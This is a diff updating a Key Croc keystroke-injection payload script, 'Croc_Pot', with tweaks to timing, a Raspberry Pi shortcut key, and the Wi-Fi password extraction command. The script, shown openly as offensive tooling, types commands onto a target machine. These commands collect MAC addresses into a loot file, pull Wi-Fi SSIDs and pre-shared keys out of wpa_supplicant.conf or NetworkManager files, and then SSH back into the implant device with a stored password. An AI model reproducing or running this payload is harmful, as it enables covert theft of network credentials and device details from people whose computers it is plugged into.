@@ -1,7 +1,7 @@
 # Title:         Croc_Pot Payload
 # Description:   Start Croc_pot bash script
 # Author:        Spywill
-# Version:       1.0.2
+# Version:       1.0.3
 # Category:      Key Croc
 #
 #
@@ -43,7 +43,7 @@ case $TARGET_OS in
            sleep 2
            Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
            Q ENTER
-           sleep 2           
+           sleep 3           
            ATTACKMODE HID
            sleep 1
            Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
@@ -85,7 +85,7 @@ case $TARGET_OS in
            sleep 3
            case $TARGET_HOSTNAME in
 raspberrypi) 
-           Q CONTROL-ALT-d
+           Q GUI d
            sleep 1
            Q STRING "terminal"
            Q ENTER
@@ -99,17 +99,18 @@ raspberrypi)
            Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER}" 
            Q ENTER
            sleep 1
-           Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
+           Q STRING "sed -n '/ssid\|psk/,+1p' /etc/wpa_supplicant/wpa_supplicant.conf | sed -e 's/[\"]//g' | tee -a \${PC_USER}"
            Q ENTER
            sleep 1
            Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
            Q ENTER
-           sleep 1
+           Q ENTER
+           sleep 2
            ATTACKMODE HID
            sleep 1
            Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
            Q ENTER
-           sleep 1
+           sleep 2
            Q STRING "${CROC_PW}"
            Q ENTER
            echo "$TARGET_OS" | tee -a ${CROC_OS}
